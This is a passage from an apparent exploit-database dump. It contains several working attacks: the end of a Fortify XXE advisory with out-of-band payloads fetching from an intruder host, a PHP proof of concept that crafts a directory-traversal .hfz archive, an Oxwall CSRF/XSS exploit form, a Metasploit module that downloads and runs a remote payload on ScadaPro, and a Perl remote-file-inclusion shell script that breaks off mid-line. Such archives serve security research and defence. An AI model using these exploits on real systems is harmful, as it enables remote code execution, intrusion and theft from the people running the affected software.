xmlns:ns7=""xmlns://www.fortifysoftware.com/schema/runtime""  xmlns:ns9=""xmlns://www.fortify.com/schema/attachments""  xmlns:ns2=""xmlns://www.fortify.com/schema/audit""  xmlns:ns4=""xmlns://www.fortifysoftware.com/schema/wsTypes""  xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"">       <ns3:TokenType>AnalysisUploadToken</ns3:TokenType>     </ns3:GetAuthenticationTokenRequest>   </soapenv:Body> </soapenv:Envelope>  Note: As remark that is not necessary to be used the credentials or any authentication, the POST method above was extracted using Burp Suite to know the  exact API path and data sending to the server.  RedTeam Vector (1): Using “Transitional” payload, connection to HTTP server (intruder). it works!  POST /ssc/fm-ws/services HTTP/1.1 Accept-Encoding: gzip, deflate SOAPAction: """" Accept: text/xml Content-Type: text/xml; charset=UTF-8; text/html; Cache-Control: no-cache Pragma: no-cache User-Agent: Java/1.8.0_121 Host: fortifyserver.com Connection: close Content-Length: 1789  <?xml version=""1.0"" encoding=""utf-8""?> <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Transitional//EN"" ""http://intruder.ip.here/alex1.dtd"">  [../snip]  RedTeam Vector (2): Classic ""OOB XXE"" payload, connection to HTTP server (intruder), it works!  POST /ssc/fm-ws/services HTTP/1.1 Accept-Encoding: gzip, deflate SOAPAction: """" Accept: text/xml Content-Type: text/xml; charset=UTF-8 Cache-Control: no-cache Pragma: no-cache User-Agent: Java/1.8.0_121 Host: fortifyserver.com Connection: close Content-Length: 1750  <?xml version='1.0' encoding='UTF-8'?> <!DOCTYPE data SYSTEM ""http://intruder.ip.here/alex1.dtd""> <data>&send;</data>  [../snip]   RedTeam Vector (3): FTP payload with ruby FTP server emulator  POST /ssc/fm-ws/services HTTP/1.1 Accept-Encoding: gzip, deflate SOAPAction: """" Accept: text/xml Content-Type: text/xml; charset=UTF-8 Cache-Control: no-cache Pragma: no-cache User-Agent: Java/1.8.0_121 Host: fortifyserver.com Connection: close Content-Length: 1769  <?xml version='1.0' encoding='UTF-8'?> <!DOCTYPE data SYSTEM ""ftp://intruder.ip.here:2121"">  [../snip]   RedTeam Vector (4): FTP payloads with FTP python server  POST /ssc/fm-ws/services HTTP/1.1 Accept-Encoding: gzip, deflate SOAPAction: """" Accept: text/xml Content-Type: text/xml; charset=UTF-8 Cache-Control: no-cache Pragma: no-cache User-Agent: Java/1.8.0_121 Host: fortifyserver.com Connection: close Content-Length: 1769  <?xml version='1.0' encoding='UTF-8'?> <!DOCTYPE data SYSTEM ""ftp://intruder.ip.here:2121"">  [../snip]   RedTeam Vector (5): FTP payload, server compromised  POST /ssc/fm-ws/services HTTP/1.1 Accept-Encoding: gzip, deflate SOAPAction: """" Accept: text/xml Content-Type: text/xml; charset=UTF-8 Cache-Control: no-cache Pragma: no-cache User-Agent: Java/1.8.0_121 Host: fortifyserver.com Connection: close Content-Length: 1769  <?xml version='1.0' encoding='UTF-8'?> <!DOCTYPE data SYSTEM ""ftp://anonymous:anonymous@intruder.ip.here:2121/alex1.txt"">  [../snip]   Mitigations ================ Provided by the vendor here:  Document ID: KM03201563 https://softwaresupport.softwaregrp.com/document/-/facetsearch/document/KM03201563  Disclosure policy ================ We believes in responsible disclosure. Please contact us on Alex Hernandez aka alt3kx () protonmail com to acknowledge this report.   This vulnerability will be published if we do not receive a response to this report with 10 days.  Timeline ================  2018-05-24: Discovered 2018-05-25: Retest PRO environment 2018-05-31: Vendor notification, two issues found  2018-05-31: Vendor feedback received  2018-06-01: Internal communication 2018-06-01: Vendor feedback, two issues are confirmed 2018-06-05: Vendor notification, new issue found 2018-06-06: Vendor feedback, evaluating High submission 2018-06-08: Vendor feedback, High issue is confirmed 2018-06-19: Researcher, reminder sent 2018-06-22: Vendor feedback, summary of CVEs handled as official way 2018-06-26: Vendor feedback, official Hotfix for High issue available to test 2018-06-29: Researcher feedback 2018-07-02: Researcher feedback 2018-07-04: Researcher feedback, Hotfix tested on QA environment 2018-07-05: Vendor feedback 2018-07-09: Vendor feedback, final details to disclosure the CVE and official Hotfix availabe for customers. 2018-07-09: Vendor feedback, CVE and official Hotfix to be disclosure 2018-07-12: Agreements with the vendor to publish the CVE/Advisory.  2018-07-12: Public report",.microfoc,1
8670,"Pinnacle Studio 12 - '.hfz' Directory Traversal <?php     /*     Pinnacle Studio 12 ""Hollywood FX Compressed Archive"" (.hfz) directory     traversal vulnerability poc     by Nine:Situations:Group::pyrokinesis           Our site: http://retrogod.altervista.org/     Software site: http://www.pinnaclesys.com/           Some keys exported from the registry:           [HKEY_CLASSES_ROOT\.hfz]     @=""hfzfile""           [HKEY_CLASSES_ROOT\.hfz\hfzfile]           [HKEY_CLASSES_ROOT\.hfz\hfzfile\ShellNew]           [HKEY_CLASSES_ROOT\hfzfile]     @=""Hollywood FX Compressed Archive""           [HKEY_CLASSES_ROOT\hfzfile\DefaultIcon]     @=""C:\\WINDOWS\\Installer\\{D041EB9E-890A-4098-8F94-51DA194AC72A}\\_A7BEE02B_CF3C_4710_85A0_92A3876E6F9C,0""           [HKEY_CLASSES_ROOT\hfzfile\shell]           [HKEY_CLASSES_ROOT\hfzfile\shell\Open]           [HKEY_CLASSES_ROOT\hfzfile\shell\Open\command]     @=""\""C:\\Documents and Settings\\All Users.WINDOWS\\Documenti\\Pinnacle\\Content\\HollywoodFX\\InstallHFZ.exe\"" \""%1\""""     ""command""=hex(7):70,00,7e,00,46,00,78,00,6b,00,3f,00,49,00,63,00,69,00,38,00,\     79,00,2b,00,37,00,32,00,6f,00,21,00,31,00,61,00,68,00,31,00,48,00,46,00,58,\     00,3e,00,49,00,4d,00,53,00,27,00,73,00,50,00,7a,00,2e,00,6a,00,3d,00,34,00,\     70,00,41,00,5b,00,4e,00,72,00,64,00,29,00,70,00,76,00,20,00,22,00,25,00,31,\     00,22,00,00,00,00,00           Usually files are decompressed in a Pinnacle effects folder...     Problem is ... that .hfz files can be used to overwrite files on the target system     or placing scripts in Startup folders by directory traversal attacks     and InstallHFX.exe decompresses them with no prompts!     Just modified an existing .hfz file and here it is the dump ...     Also I experienced some crashes in doing this... investigating...           */           $____path = ""..\\..\\..\\..\\..\\..\\..\\..\\pyro.cmd"";           $____payload = ""\x48\x46\x58\x5a\x48\x46\x58\x5a\x9c\x07\x00\x00\x49\x00\x00\x00"". ""\x00\x21\x00\x00\x00\x7e"". $____path. ""\x65\x07\x00\x00\xa8\x1c\x00\x00\x8d\xc2\x71\x5a"". ""\x78\x9c\xbd\x59\x7b\x4c\x53\x57\x1c\xbe\x05\xf6\x10\x96\x6c\x0b"". ""\x33\xab\x2f\x5a\x2d\xe0\xe4\xdd\xd6\x84\xf2\x18\xbd\x2d\x6f\x04"". ""\x8a\xa5\x50\x44\x50\xcb\x1b\x05\x8a\x3c\xb4\x22\x8e\x25\x26\xcb"". ""\xd4\x64\xee\x8f\x2d\x9b\xcb\xe6\xd4\x2c\x21\xd3\x65\x6e\x59\xa2"". ""\x5b\x8c\x01\x97\xa8\x89\xc1\x05\xf7\xd7\xd8\x12\xcd\xc8\x12\x51"". ""\xf7\x62\xe0\x03\x5f\x77\xdf\xed\x69\x2f\xb7\xb7\xb7\xb7\xe5\xb2"". ""\xec\xe4\x77\x2e\xe7\x9e\x7b\xce\xef\x7c\xf7\xfb\x3d\xce\xb9\xa5"". ""\xa8\xa0\x26\xbf\x28\x3f\x4f\x97\x42\x51\x54\x24\xaa\xd9\x54\x99"". ""\x5c\xd1\xde\xad\x4e\xd3\xe3\x86\x3a\xd4\xd1\x9a\x13\x45\x7a\x93"". ""\x2a\x4a\x51\xad\x16\xb6\x5b\x41\x29\x5c\x54\x71\x59\xa1\x76\xf0"". ""\x15\x8a\x0a\x53\x84\x47\xa4\xa1\x33\x16\xd5\xfb\x37\x70\x79\xd3"". ""\xc8\xaf\x76\x3b\x13\x54\xaa\xab\x9f\x86\x32\xec\x3f\x97\x50\xd6"". ""\x4d\x4c\x1c\x0a\x2a\x09\x09\x6f\x48\x0f\x08\x65\xa1\xaa\xaa\x27"". ""\x16\xcb\x7d\xc8\x22\xf1\x00\x4c\x7a\xfa\x90\x46\xb3\x3b\x14\xe4"". ""\x44\x44\x17\x6a\x69\x61\x76\xee\x64\x6c\xb6\xc7\x10\x09\x3c\x4c"". ""\x5c\x9c\x3c\x79\x1a\x1b\xcb\xbf\x95\xc6\xd3\xdd\xcd\x6c\xde\xcc"". ""\x6c\xdc\x38\x07\x7e\x9c\x4e\xc6\x6a\x7d\x88\x76\x40\x3c\xa9\xa9"". ""\xf7\x56\xae\x0c\x02\x20\x21\xe1\xa1\x5a\x2d\x31\x60\xe2\xcc\x19"". ""\xbe\xf8\x2f\x04\x0c\xe0\x07\xd7\xca\xca\x47\x5b\xb7\x32\xa5\xa5"". ""\xb3\x25\x25\xff\x04\xe4\x67\xfd\xfa\x07\x31\x31\x8f\xd7\xac\x09"". ""\xb4\x1c\xc0\xb0\x78\xd2\xd3\xef\xaf\x5a\x25\x0f\x0f\x64\x60\x80"". ""\xb5\x17\x50\xa1\x8d\x6b\x4d\x0d\x53\x5b\x1b\x00\x0f\x4d\x33\x26"". ""\x93\xc0\x04\x44\xe6\x62\x63\x87\x95\x4a\xc8\x1d\x70\xa8\xd5\x4a"". ""\xf0\x33\x7b\xed\xda\x0f\xa7\x4e\x49\xe0\x81\xdb\x13\x4e\x60\x3e"". ""\xc2\x18\xb1\x1a\xdf\xc9\xe7\x75\xc6\xc7\xcf\xa9\x54\xb3\xcb\x97"". ""\x0b\x50\x4d\xb9\xcb\x65\x9b\x6b\x9a\xb0\x97\x98\xc8\xac\x5d\x8b"". ""\xc6\xa3\xd5\xab\xfd\xf9\xf9\xf1\xf4\x69\x09\x3c\x44\x0a\x0b\xff"". ""\x22\x60\x7a\x7a\x3c\x44\x01\xe7\x86\x0d\x33\xe4\x29\x56\xf7\x01"". ""\x60\x36\xb3\x0b\xe9\xf5\x5c\xe7\x6d\x77\x99\xd8\xba\x7f\x9a\xb3"". ""\xa6\xc1\xc0\x5e\x4d\x26\x51\x7b\x4d\x5d\xbc\x28\x8d\x07\x02\x4b"". ""\x11\x5a\x9a\x9b\x59\x3c\xad\xad\xec\x6d\x47\x87\x78\x7c\xb1\x48"". ""\x52\x53\xe1\xc0\x84\x01\x82\xe7\x6a\xcd\xc0\xb4\xc0\xbb\x32\x32"". ""\xf8\x2f\x12\x8a\xff\x08\xa4\xa8\xe8\x6f\xe0\x81\xc9\xca\xcb\xef"". ""\x21\x1b\x80\xb1\x80\xf1\x1e\x1f\xef\x01\x96\x99\x49\xf0\x7c\x91"". ""\xd7\x26\xc4\xc3\x49\x72\x32\xae\x93\x23\x23\x0b\xc5\x43\x04\x90"". ""\x20\x68\xec\xd8\xc1\x72\x25\x11\xc2\x0f\xd6\xac\x99\xd1\x68\x08"". ""\x9e\xc3\x7a\x3b\xf0\xf8\x3b\x3c\xd7\xf3\xf3\xd9\xb3\x80\x71\x65"". ""\x78\x78\xa1\x78\x88\xa5\x90\x04\x48\xdc\x91\xe0\x12\x8d\xe2\xdf"". ""\xba\x3e\x44\x58\x11\x3c\xfb\xd3\x6c\x1c\x3f\xa2\x61\x48\x60\x5c"". ""\x3f\x77\x4e\x06\x1e\x22\x34\x3d\x55\x5f\xcf\x20\xa0\xe0\xc3\xac"". ""\xce\xec\x6c\xc1\x8b\x03\x46\xd2\xd2\xd5\x04\xcf\x50\x8a\x15\x78"". ""\x66\x96\x2d\x93\x88\x77\x79\xf6\xe2\x0b\xd2\x91\x27\xc9\xa8\x54"". ""\x82\x64\x48\xf0\x70\x65\xdf\x6b\x65\x7f\xa8\x54\x4f\x34\x1a\x8c"". ""\x14\xc5\x83\x80\xad\xab\x63\x75\xba\x5c\x9e\xd4\x27\x0f\x12\x5f"". ""\xe7\xdd\x15\x2b\x18\xa3\x91\x6f\x3b\x0e\xcf\x50\x42\xb9\xc7\x5e"". ""\x08\xf3\x82\x02\x7f\x3c\x44\x1b\x49\x74\x48\xc2\xc8\x2d\xd8\xd0"". ""\x17\x89\x87\x64\x39\x6c\x1c\x10\x01\xa4\xb7\x12\xca\x89\xdb\x60"". ""\x00\x1a\xe4\xea\x8f\x67\xef\x5e\xa6\xa2\xe2\xc1\xf6\xed\x32\xc9"". ""\x09\x18\xef\x49\x49\xdc\xee\x79\x43\xad\xbe\x2c\xd8\x6d\xe3\xe3"". ""\x81\x07\xb6\xf3\xc7\x63\x77\x6f\x0a\x70\x4b\xd1\xb5\xf2\xf2\x7e"". ""\x97\x89\x87\x64\xe0\x94\x14\xa9\x7d\xdf\x68\x84\xcb\x71\xc0\x82"". ""\x2e\xb4\x6b\x17\x0b\x15\x3b\xbb\x1c\x3c\x71\x71\xac\x17\x91\xb8"". ""\x93\x90\xac\x2c\xce\xb2\xd2\xab\x20\xbd\x60\x77\x40\x86\x41\x1e"". ""\x16\x3d\xf9\x70\x27\xcc\x20\x2b\x86\x2c\x12\x60\xb0\x5b\xc1\xc3"". ""\xe1\xea\x84\x1c\x04\x20\x12\x20\x4e\x65\x12\x53\x2c\x96\x5b\x34"". ""\x7d\x2e\x3b\xfb\xeb\xf0\xf0\xe7\x15\x0a\xc5\xf8\xf8\x38\x17\x59"". ""\x4a\xa5\xb2\x25\xc1\x66\x30\x0c\xe7\xe5\x9d\xed\xef\x9f\x95\xed"". ""\xa8\x90\xe2\xe2\x69\x72\x50\x04\x1b\x88\x3e\x89\x00\x3c\x5a\xff"". ""\xd5\x65\xc7\xe1\x0f\x8a\x9d\x1f\x97\xb8\xb0\xb4\xc9\x74\xe1\xd2"". ""\xa5\x4b\x1c\xa4\x88\xb0\x70\xbb\xe9\xdd\xa2\xa2\xef\x2a\x2b\xef"". ""\x6d\xd9\xc2\x1e\xed\xf8\x0c\x87\xfe\xb5\x82\xd0\xc3\x60\xd8\x0e"". ""\x48\x36\x6d\x62\x7b\xba\xba\x44\x86\x61\x39\x7c\x36\x69\x34\x9a"". ""\xba\xba\xfa\x77\x68\x27\xf0\x64\x64\x7c\x8e\x1e\x0e\x0f\xda\xb5"". ""\xba\x01\x9a\xbe\x68\xb3\x3d\x82\x4e\x37\x9f\xf7\x17\xf3\xd1\x84"". ""\x97\xb2\xf3\x92\x15\xd9\x4f\x39\x99\x98\x98\x20\xeb\xe2\xdc\x65"". ""\x50\x26\xef\xd1\x37\x64\x19\x3e\x8b\x8a\x8a\xe2\xe3\xc9\x32\x9c"". ""\xac\xa8\xb8\xd3\xde\xce\x8e\x87\x1b\x00\x0c\xf4\x2c\x06\x12\x72"". ""\x14\xdc\x1b\x2c\x35\x34\x30\x4d\x4d\x9e\xc3\x06\x61\x9b\x4f\x85"". ""\xcb\xe5\x22\x5f\x99\xfc\xcd\xe2\x99\xb0\x88\x92\x92\x5f\x0a\x0a"". ""\xfe\xc4\x78\xf8\x21\x08\x07\x4b\x7d\x7d\x8c\xc3\xc1\x48\x7f\xbc"". ""\x04\x75\x72\xac\x0e\xdf\x6e\x6b\x63\x4d\x09\x23\x92\xd0\x4b\x4d"". ""\x3d\x74\x3b\x70\x01\xc2\xda\x9c\x63\x55\x55\x8f\x89\x12\x4c\x21"". ""\xd2\xd8\xc8\x12\x0e\x9d\x38\x4d\xc9\x66\x69\xdb\x36\x76\x5b\x81"". ""\x12\xe0\x21\xa9\x60\x70\x90\xed\x17\x10\xc2\x95\xc9\xc9\x49\xda"". ""\xf0\x49\x75\xb5\x30\x10\xb8\x2f\x17\x38\x52\x6f\xaf\xd4\xf7\x54"". ""\x50\x41\x74\xec\xde\xed\xc9\x4b\x50\x88\x36\x10\xe2\xd8\x1f\x1d"". ""\x9d\x0e\x2a\x38\x24\x37\x6f\xde\x8c\x8c\x8c\xb4\x5a\x67\x02\xe9"". ""\x01\x12\x58\x1f\xc1\x8b\xb7\x83\x06\xec\x5c\x65\x65\x77\x65\x13"". ""\x05\xc1\x7b\xd9\xdd\x99\x13\x0a\xe1\x51\xa4\x93\xa6\xcf\x47\x46"". ""\xc6\x28\x95\x85\x36\x5b\x90\x0f\x6d\xbb\x7b\x0b\x20\xfe\x83\x78"". ""\x21\x9c\xcb\x76\x27\xbb\x3b\x3b\xe1\x8a\xbd\x0f\x07\x57\x34\x48"". ""\x42\x58\x28\xed\xb0\x54\x67\x27\x1b\x14\x08\x3d\x72\xe0\x44\xbc"". ""\xc8\x86\x04\x72\x48\x03\x84\x93\x2c\x07\xce\x83\x6e\x79\xfe\x82"". ""\xb4\x06\xae\xc8\xdb\xe5\xe6\xde\xe1\x82\xd7\x5f\x42\x4c\x11\xe4"". ""\x68\x07\x6f\x87\xc8\xce\x2a\x5c\xc0\xf6\xf7\x33\x24\x53\xc9\x16"". ""\xd0\x02\x25\x7b\xf6\x2c\x4a\x89\xc9\x74\x0b\x2e\x84\x24\x40\x72"". ""\xf8\xe2\x45\xde\x09\x53\x20\x41\x7f\x71\xfa\xff\x85\x6f\x71\x4b"". ""\x85\x4d\x67\x45\x7a\x9b\x0a\x9f\xff\x75\x91\x2b\x0a\x4f\x25\x17"". ""\xae\xc1\xfe\xf0\x48\xb3\x8d\x70\xfe\x14\x3c\x8a\xe1\xcd\x3d\x92"". ""\x5f\x5e\xad\x9d\x43\x63\xfc\x39\xaf\x66\x93\x8a\xb4\xc2\xa9\x08"". ""\xd1\x5f\x36\x97\x84\xf4\xab\xe7\xd5\xb1\xd2\x1c\xe1\xbc\x0b\x63"". ""\xa5\xc6\xd6\x96\xf8\x11\x8a\x1a\x1d\xf1\x7d\x46\x1b\xbd\xf5\xea"". ""\xd8\x98\xcf\x3c\x05\x59\x6f\x54\xaf\xff\x06\x73\xe8\x51\xc1\x82"". ""\xc6\xf9\xea\xc3\x49\xe8\xf3\xbc\x04\x5c\xe3\x08\x30\x87\x42\x00"". ""\x1d\x4c\xf1\x47\x47\x96\x89\x01\x0a\x3a\x0f\xc4\x19\x7d\x1f\x2d"". ""\xa1\xd2\x22\xed\x23\x85\xbf\x66\x4a\x12\x27\x24\x20\x54\x43\x51"". ""\x65\xf9\x79\x5a\xd6\xb7\x8e\xbd\x38\xff\x88\xa2\x5e\x40\x2d\x72"". ""\xf6\xf6\xa9\xab\xdb\x9b\x9a\x9d\x6a\xbd\xf0\x3e\x82\xe2\x8f\x16"". ""\x96\x97\xd6\xe2\x72\xc4\xab\xf9\xb8\x94\x66\xad\xf0\x7e\x21\x9a"". ""\x4f\x48\x69\xd6\x09\xef\x43\xd1\x5c\x69\x2d\xd0\x9e\x44\xe3\xed"". ""\x68\xfe\x58\xf7\x7f\x0c\x1c\x8d\x3b\x9a\x7a\x9c\xdd\x6a\x3d\x45"". ""\x0d\x19\xe7\xab\xb8\x36\x91\xa2\xa0\xc2\x28\x12\x93\x34\xed\x3f"". ""\xcd\x4b\xbf\x58\xe1\x59\xab\xc9\x8b\x14\x25\xcc\x7d\x65\x11\x0f"". ""\xe3\xef\x01\x1f\xc4\xac\x37\x7b\x08\x15\x81\xcb\xd5\xf3\x5d\xd4"". ""\x20\xfa\xcc\x22\x60\xa5\xe1\x1e\x0f\x09\x2e\xfb\x3f\x95\x68\x4f"". ""\x65\xdb\x2f\xcf\xc3\x3d\x18\x00\xae\x4e\x16\xbb\xc1\xe0\x9e\x90"". ""\x0b\x37\xd7\x54\xa6\xeb\x45\xb3\xfb\x55\x3e\x5c\xf6\x61\x99\xa3"". ""\xbd\x4b\x9d\xeb\xe8\x6c\xee\x71\xf8\x68\xa3\x03\x69\xbf\xd2\x13"". ""\x6b\x46\x7a\x7b\x9d\xa2\xb6\x99\xac\xdf\x1e\xcd\xf1\x56\xf6\x99"". ""\xe2\xbd\xf7\xa3\x15\x0a\xde\x34\xd7\xf5\xf5\x16\x73\x89\xf6\x53"". ""\x34\x69\x15\x7f\xe9\x67\x29\xe2\x8a\x6a\xfd\x3a\xb4\xf6\x76\xf7"". ""\x38\x9b\xba\x1d\x7d\x6d\xfb\x32\x2d\x0d\xdb\x9b\x1b\xfb\x7a\x33"". ""\xd3\xd2\xd4\xc9\xea\x5c\x67\x67\xa7\xb3\x2b\x93\x0c\x4c\x69\x6b"". ""\x71\x0a\x40\x8d\x0a\x38\xa0\x79\x55\xbc\x28\xdc\x21\x21\xdc\x3e"". ""\x10\x84\x5e\x98\x26\x3f\x98\x05\x1d\x8e\x3e\xb5\x36\x04\x98\x64"". ""\xa0\x17\x66\x65\xd6\x8d\x9c\x75\x75\xc6\x91\xef\xef\xfe\xe4\x93"". ""\xed\x96\x7e\x99\x6e\xf4\x56\x0f\x24\x31\x98\x07\xa4\x61\x9a\xc5"". ""\x61\xea\x42\x85\xa9\xe3\xb1\x19\x34\x99\x4b\xc0\x3c\x28\x0e\xf3"". ""\x5f\x77\x19\xc2\x8e\x00\x00\x48\x46\x58\x5a\x28\x00\x00\x00\x44"". ""\x00\x00\x00\x00\x11\x00\x00\x00\x7e\x6f\x72\x67\x73\x3a\x65\x66"". ""\x66\x65\x63\x74\x73\x2e\x6f\x72\x67\x00\x00\x00\x00\x00\x00\x00"". ""\x00\x00\x00\x00\x00\x34\x00\x00"";           $_f = fopen(""puf.hfz"", ""w+"");           fputs($_f, $____payload);           fclose($_f);       ?>  # milw0rm.com [2009-05-13]",Pinnacle,1
38581,"Oxwall 1.7.4 - Cross-Site Request Forgery Advisory ID: HTB23266 Product: Oxwall Vendor: http://www.oxwall.org Vulnerable Version(s): 1.7.4 and probably prior Tested Version: 1.7.4 Advisory Publication:  July 1, 2015  [without technical details] Vendor Notification: July 1, 2015  Vendor Patch: September 8, 2015  Public Disclosure: October 22, 2015  Vulnerability Type: Cross-Site Request Forgery [CWE-352] CVE Reference: CVE-2015-5534 Risk Level: High  CVSSv3 Base Score: 7.1 [CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L] Solution Status: Fixed by Vendor Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ )   -----------------------------------------------------------------------------------------------  Advisory Details:  High-Tech Bridge Security Research Lab discovered vulnerability in Oxwall, which can be exploited to perform CSRF (Cross-Site Request Forgery) attacks. An attacker might be able to put the website under maintenance and perform XSS attacks against website visitors.  The vulnerability exists due to failure in the ""/admin/pages/maintenance"" script to properly verify the source of the HTTP request. A remote attacker can trick a logged-in administrator to visit a page with CSRF exploit and put the entire website under maintenance. Additionally, the attacker is able to inject arbitrary HTML and JavaScript code into maintenance message and execute it in browsers of any website visitor. Successful exploitation of this vulnerability may allow an attacker to steal other users’ cookies, spread malware to website visitors, and even obtain full control over vulnerable website.   A simple CSRF exploit below puts the website under maintenance and displays a JS popup with ""ImmuniWeb"" word to every website visitor:   <form action = ""http://[host]/admin/pages/maintenance"" method = ""POST""> <input type=""hidden"" name=""form_name"" value=""maintenance""> <input type=""hidden"" name=""maintenance_enable"" value=""on""> <input type=""hidden"" name=""save"" value=""Save""> <input type=""hidden"" name=""maintenance_text"" value=""<script>alert('ImmuniWeb');</script>""> <input value=""submit"" id=""btn"" type=""submit"" /> </form> <script> document.getElementById('btn').click(); </script>   -----------------------------------------------------------------------------------------------  Solution:  Update to Oxwall 1.8  -----------------------------------------------------------------------------------------------  References:  [1] High-Tech Bridge Advisory HTB23266 - https://www.htbridge.com/advisory/HTB23266 - Cross-Site Request Forgery on Oxwall. [2] Oxwall - http://www.oxwall.org/ - Oxwall® is unbelievably flexible and easy to use PHP/MySQL social networking software platform. [3] Common Vulnerabilities and Exposures (CVE) - http://cve.mitre.org/ - international in scope and free for public use, CVE® is a dictionary of publicly known information security vulnerabilities and exposures. [4] Common Weakness Enumeration (CWE) - http://cwe.mitre.org - targeted to developers and security practitioners, CWE is a formal list of software weakness types. [5] ImmuniWeb® SaaS - https://www.htbridge.com/immuniweb/ - hybrid of manual web application penetration test and cutting-edge vulnerability scanner available online via a Software-as-a-Service (SaaS) model.  -----------------------------------------------------------------------------------------------  Disclaimer: The information provided in this Advisory is provided ""as is"" and without any warranty of any kind. Details of this Advisory may be updated in order to provide as accurate information as possible. The latest version of the Advisory is available on web page [1] in the References.",oxwall,1
17848,"Measuresoft ScadaPro 4.0.0 - Remote Command Execution (Metasploit) ## # $Id: scadapro_cmdexe.rb 13737 2011-09-16 08:23:59Z sinn3r $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = ExcellentRanking  	include Msf::Exploit::Remote::HttpServer::HTML 	include Msf::Exploit::Remote::Tcp 	include Msf::Exploit::EXE  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'Measuresoft ScadaPro <= 4.0.0 Remote Command Execution', 			'Description'    => %q{ 					This module allows remote attackers to execute arbitray commands on  				the affected system by abusing via Directory Traversal attack when using the 'xf' 				command (execute function). An attacker can execute system() from msvcrt.dll to 				upload a backdoor and gain remote code execution. 			}, 			'License'        => MSF_LICENSE, 			'Author'         => 				[ 					'Luigi Auriemma',                           # Initial discovery/poc 					'mr_me <steventhomasseeley[at]gmail.com>',  # msf 					'TecR0c <tecr0c[at]tecninja.net>',          # msf 				], 			'Version'        => '$Revision: 13737 $', 			'References'     => 				[ 					#[ 'CVE', '?'], 					#[ 'OSVDB', '?'], 					[ 'BID', '49613'], 					[ 'URL', 'http://aluigi.altervista.org/adv/scadapro_1-adv.txt'], 					[ 'URL', 'http://us-cert.gov/control_systems/pdf/ICS-ALERT-11-256-04.pdf'], 					# seemed pretty accurate to us ;) 					[ 'URL', 'http://www.measuresoft.net/news/post/Inaccurate-Reports-of-Measuresoft-ScadaPro-400-Vulnerability.aspx'], 				], 			'DefaultOptions' => 				{ 					'InitialAutoRunScript' => 'migrate -f', 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					# truly universal 					[ 'Automatic', { } ], 				], 			'DefaultTarget'  => 0, 			'DisclosureDate' => 'Sep 16 2011'))  			register_options( 			[ 				Opt::RPORT(11234), 				OptString.new('URIPATH', [ true, ""The URI to use."", ""/"" ]), 			], self.class) 	end  	# couldn't generate a vbs or exe payload and then use the wF command 	# as there is a limit to the amount of data to write to disk. 	# so we just write out a vbs script like the old days.  	def build_vbs(url, stager_name) 		name_xmlhttp = rand_text_alpha(2) 		name_adodb   = rand_text_alpha(2)  		tmp = ""#{@temp_folder}/#{stager_name}""  		vbs  = ""echo Set #{name_xmlhttp} = CreateObject(\""Microsoft.XMLHTTP\"") "" 		vbs << "": #{name_xmlhttp}.open \""GET\"",\""http://#{url}\"",False : #{name_xmlhttp}.send"" 		vbs << "": Set #{name_adodb} = CreateObject(\""ADODB.Stream\"") "" 		vbs << "": #{name_adodb}.Open : #{name_adodb}.Type=1 "" 		vbs << "": #{name_adodb}.Write #{name_xmlhttp}.responseBody "" 		vbs << "": #{name_adodb}.SaveToFile \""#{@temp_folder}/#{@payload_name}.exe\"",2 "" 		vbs << "": CreateObject(\""WScript.Shell\"").Run \""#{@temp_folder}/#{@payload_name}.exe\"",0 >> #{tmp}""  		return vbs 	end  	def on_request_uri(cli, request) 		if request.uri =~ /\.exe/ 			print_status(""Sending 2nd stage payload to #{cli.peerhost}:#{cli.peerport}..."") 			return if ((p=regenerate_payload(cli)) == nil) 			data = generate_payload_exe( {:code=>p.encoded} ) 			send_response(cli, data, {'Content-Type' => 'application/octet-stream'} ) 			return 		end 	end  	def exploit 		# In order to save binary data to the file system the payload is written to a .vbs 		# file and execute it from there. 		@payload_name = rand_text_alpha(4) 		@temp_folder  = ""C:/Windows/Temp""  		if datastore['SRVHOST'] == '0.0.0.0' 			lhost = Rex::Socket.source_address('50.50.50.50') 		else 			lhost = datastore['SRVHOST'] 		end  		payload_src  = lhost 		payload_src << "":"" << datastore['SRVPORT'] << datastore['URIPATH'] << @payload_name << "".exe""  		stager_name = rand_text_alpha(6) + "".vbs"" 		stager      = build_vbs(payload_src, stager_name)  		path = ""..\\..\\..\\..\\..\\windows\\system32""  		createvbs = ""xf%#{path}\\msvcrt.dll,system,cmd /c #{stager}\r\n"" 		download_execute = ""xf%#{path}\\msvcrt.dll,system,start #{@temp_folder}/#{stager_name}\r\n""  		print_status(""Sending 1st stage payload..."")  		connect 		sock.get_once() 		sock.put(createvbs) 		sock.get_once() 		sock.put(download_execute) 		handler() 		disconnect  		super 	end  end",Measuresoft,1
2175,"WEBInsta CMS 0.3.1 - 'templates_dir' Remote File Inclusion #!/usr/bin/perl ## # WEBinsta CMS 0.3.1 (templates_dir) Remote File Inclusion Exploit # Bug Found & code By K-159  ## # echo.or.id (c) 2006 #  ## # usage: # perl WEBinsta.pl <target> <cmd shell location> <cmd shell variable> # # perl WEBinsta.pl http://target.com/ http://site.com/cmd.txt cmd # # cmd shell example: <?passthru($_GET[cmd]);?> # # cmd shell variable: ($_GET[cmd]); ## # # #Greetz: My Dearest Wife - ping, echo|staff (y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,negative), SinChan, sakitjiwa, maSter-oP, mr_ny3m, bithedz, lieur-euy, x16, mbahngarso, etc #  # Contact: www.echo.or.id #e-c-h-o @irc.dal.net ##  use LWP::UserAgent;  $Path = $ARGV[0]; $Pathtocmd = $ARGV[1]; $cmdv = $ARGV[2];  if($Path!~/http:\/\// || $Pathtocmd!~/http:\/\// || !$cmdv){usage()}  head();  while() {        print ""[shell] \$""; while(<STDIN>)        {                $cmd=$_;                chomp($cmd);  $xpl = LWP::UserAgent->new() or die; $req = HTTP::Request->new(GET =>$Path.'index.php?templates_dir='.$Pathtocmd.'?&'.$cmdv.'='.$cmd)or die ""\nCould Not connect\n"";  $res = $xpl->request($req); $return = $res->content; $return =~ tr/[\n]/[....]/;  if (!$cmd) {print ""\nPlease Enter a Command\n\n""; $return 